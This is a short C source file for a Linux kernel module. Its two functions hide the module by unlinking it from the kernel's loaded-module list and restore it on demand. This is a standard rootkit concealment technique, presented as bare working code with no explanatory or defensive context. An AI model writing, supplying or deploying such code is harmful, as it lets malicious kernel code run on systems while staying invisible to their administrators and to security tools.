#include "hide_module.h"

unsigned short mod_hidden = 0;
struct list_head *mod_prev;

void module_hide(void)
{
    mod_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list); 
    mod_hidden = 1;
}

void module_show(void)
{
    list_add(&THIS_MODULE->list, mod_prev);
    mod_hidden = 0;
}